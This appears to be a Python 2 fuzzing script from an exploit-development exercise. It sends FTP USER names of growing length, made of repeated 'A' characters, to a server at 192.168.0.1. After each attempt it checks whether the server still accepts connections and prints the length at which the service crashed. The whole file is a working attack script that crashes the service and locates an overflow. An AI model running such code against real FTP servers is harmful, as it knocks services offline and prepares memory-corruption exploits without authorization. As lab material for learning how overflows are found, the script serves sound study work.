import ftplib
import time
import socket

ip = "192.168.0.1"
port = 21
buffer= ""
incbuffer = 200
maxbuf = 3000

while len(buffer) < maxbuf: 
	buffer = buffer + "A" * incbuffer
	print "Trying USER length of: " + str(len(buffer))

	try:
		ftp = ftplib.FTP(ip, buffer, 'test')
	except Exception:
		print "Sent!"
        time.sleep(2)
        
        try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                conn = sock.connect((ip, port))
        except Exception:
                print "Died at: " + str(len(buffer))
                break

    

                

        	

        

    
